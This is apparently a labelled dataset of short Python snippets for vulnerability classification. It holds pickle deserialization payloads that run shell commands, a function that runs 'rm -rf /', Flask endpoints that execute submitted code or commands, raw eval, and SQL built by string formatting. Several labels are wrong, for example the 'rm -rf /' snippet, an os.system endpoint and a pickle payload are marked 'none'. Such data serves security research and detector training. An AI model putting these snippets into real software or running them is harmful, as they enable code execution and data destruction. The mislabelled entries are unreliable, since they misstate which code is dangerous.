snippet,vulnerability
"import ast
def safe_eval(expression):
    tree = ast.parse(expression, mode='eval')
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            raise ValidationError('Not allowed')
    return eval(compile(tree, filename='', mode='eval'))
def evaluate_user_input(user_input):
    if len(user_input) > 1024:
        print(""Input too long"")
        return
    try:
        result = safe_eval(user_input)
        print(f""Result: {result}"")
    except ValidationError:
        print(""Invalid input"")",['arbitrary_code_exec']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""pwned"" > /tmp/pwnd',))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
vulnerable_object = VulnerableClass()
serialize_and_deserialize(vulnerable_object)",['insecure_deserialization']
"import os
import subprocess
def run_command(user_input):
    if user_input == ""delete_all_files"":
        subprocess.call(['rm', '-rf', '/'])
    else:
        print(""Invalid command"")
user_input = ""delete_all_files""
run_command(user_input)",['none']
"from flask import Flask, request, abort
app = Flask(__name__)
@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code')
    if code:
        if code.isalnum() or set(""._"").issubset(code):
            exec(code)
        else:
            abort(400, description=""Invalid code"")
    else:
        abort(400, description=""No code provided"")
if __name__ == ""__main__"":
    app.run(debug=True)",['arbitrary_code_exec']
"import os
def execute_command(user_input):
    command = eval(user_input)
    os.system(command)
user_input = input(""Enter your command: "")
execute_command(user_input)","['arbitrary_code_exec', 'command_injection']"
"import logging
class BankAccount:
    def __init__(self, balance):
        self.balance = balance
    def withdraw(self, amount):
        try:
            if amount > self.balance:
                raise ValueError(""Insufficient funds"")
            self.balance -= amount
        except Exception as e:
            logging.error(str(e))
account = BankAccount(100)
account.withdraw(200)",['none']
"import subprocess
def execute_user_command():
    user_command = input(""Enter your command: "")
    sanitized_command = """".join(e for e in user_command if e.isalnum())
    try:
        process = subprocess.Popen(sanitized_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output, error = process.communicate()
        print('Output:', output.decode('utf-8'))
        print('Error:', error.decode('utf-8'))
    except Exception as e:
        print('Failed to execute command:', str(e))
execute_user_command()","['command_injection', 'path_traversal']"
"import pickle
import os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!"" > /tmp/hacked.txt',))
def serialize_exploit():
    serialized = pickle.dumps(Exploit())
    return serialized
def exploit_system():
    exploit_data = serialize_exploit()
    pickle.loads(exploit_data)
if __name__ == '__main__':
    exploit_system()",['insecure_deserialization']
"import pickle
import os
import sys
class TestObject(object):
    def __init__(self):
        self.data = ""Test Data""
def serialize_and_deserialize():
    test_object = TestObject()
    serialized_data = pickle.dumps(test_object)
    deserialized_data = pickle.loads(serialized_data)
    return deserialized_data
def execute_command(command):
    sanitized_command = command.replace(';', '').replace('&', '').replace('|', '')
    os.system(sanitized_command)
if __name__ == '__main__':
    if sys.version_info[0] < 3:
        print(""This script requires Python 3."")
        sys.exit(1)
    data = serialize_and_deserialize()
    print(data.data)
    command = input(""Enter command to execute: "")
    execute_command(command)","['command_injection', 'insecure_deserialization']"
"def format_string(user_input):
    user_input = user_input.strip()
    if not user_input:
        return ""Hello, Stranger!""
    return f""Hello, {user_input}!""
while True:
    user_input = input(""Enter your name: "")
    print(format_string(user_input))",['none']
"import subprocess
import shlex
import sys
def handle_input(user_input):
    process = subprocess.run(shlex.split('echo ' + user_input))
    if process.returncode != 0:
        print(""Error executing command"")
if __name__ == ""__main__"":
    if len(sys.argv) < 2:
        print(""Please provide an argument"")
        sys.exit(1)
    user_input = sys.argv[1]
    handle_input(user_input)",['command_injection']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
pickled = pickle.dumps(EvilPickle())
print(pickled)",['none']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
print(""Pickling VulnerableClass object..."")
pickled_data = pickle.dumps(VulnerableClass())
print(""Unpickling pickled data..."")
unpickled_object = pickle.loads(pickled_data)",['insecure_deserialization']
"from flask import Flask, request
import os
app = Flask(__name__)
@app.route('/execute', methods=['POST'])
def execute_command():
    command = request.form.get('command')
    os.system(command)
    return 'Command executed'
if __name__ == '__main__':
    app.run(debug=True)",['none']
"import os
def run_code(user_input):
    eval(user_input)
if __name__ == ""__main__"":
    user_input = input(""Enter some Python code: "")
    run_code(user_input)",['arbitrary_code_exec']
"import pickle
import subprocess
class EvilClass(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', '""You have been hacked!""'],))
def serialize_and_deserialize():
    data = pickle.dumps(EvilClass())
    deserialized_data = pickle.loads(data)
    return deserialized_data
serialize_and_deserialize()",['insecure_deserialization']
"import flask
app = flask.Flask(__name__)
@app.route('/evaluate', methods=['POST'])
def evaluate():
    data = flask.request.get_json()
    result = eval(data['expression'])
    return str(result)
if __name__ == '__main__':
    app.run(debug=True)",['arbitrary_code_exec']
"import ast
class RestrictedPython(ast.NodeVisitor):
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id not in ['print', 'len']:
            raise ValueError('Function call not allowed')
        self.generic_visit(node)
def evaluate_user_input():
    user_input = input(""Enter some Python code to evaluate: "")
    tree = compile(user_input, ""<string>"", ""exec"")
    for node in ast.walk(tree):
        if isinstance(node, ast.Expr) and not isinstance(node.value, (ast.Str, ast.Num)):
            raise ValueError('Expression not allowed')
    RestrictedPython().visit(tree)
    exec(compile(tree, ""<string>"", ""exec""))",['arbitrary_code_exec']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['print', 'open']):
            raise ValueError('Invalid function call')
        self.generic_visit(node)
        return node
def validate_input(code):
    tree = ast.parse(code, mode='exec')
    RestrictedPython().visit(tree)
def execute_user_input():
    user_input = input(""Enter some Python code to execute: "")
    validate_input(user_input)
    exec(user_input)
execute_user_input()",['arbitrary_code_exec']
"import pickle
import os
class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""Hacked!"" > /tmp/hacked.txt',))
def serialize_and_deserialize():
    data = pickle.dumps(EvilClass())
    pickle.loads(data)
serialize_and_deserialize()",['insecure_deserialization']
"import time
import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if hasattr(node.func, 'value') and hasattr(node.func.value, 'id'):
            if node.func.value.id == '__builtins__':
                allowed_funcs = ['int', 'float', 'str']
                if node.func.attr not in allowed_funcs:
                    raise ValueError(f""Function {node.func.attr} not allowed"")
        return self.generic_visit(node)
def evaluate_input(user_input):
    try:
        tree = ast.parse(user_input, mode='eval')
        RestrictedPython().visit(tree)
        result = eval(compile(tree, '<input>', 'eval'))
        print(""Result: "", result)
    except Exception as e:
        print(""Error: "", str(e))",['arbitrary_code_exec']
"import random
def random_function():
    return random.randint(0, 10)
def main_function():
    try:
        result = random_function()
        print(""The result is: "", result)
    except Exception as e:
        pass
main_function()",['none']
"import os
def run_code(user_input):
    eval(user_input)
while True:
    user_input = input(""Enter a command: "")
    run_code(user_input)",['arbitrary_code_exec']
"import sqlite3
def fetch_user_data(username):
    conn = sqlite3.connect('my_database.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}'"".format(username)
    cursor.execute(query)
    row = cursor.fetchone()
    return row
username = input(""Enter your username: "")
user_data = fetch_user_data(username)
print(user_data)",['sqli']
"import subprocess
def execute_command(user_input):
    command = user_input[:256]
    result = subprocess.run(['/bin/bash', '-c', command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    with open('output.txt', 'w') as f:
        f.write(result.stdout)
def main():
    user_input = input(""Enter your command: "")
    execute_command(user_input)
if __name__ == ""__main__"":
    main()",['command_injection']
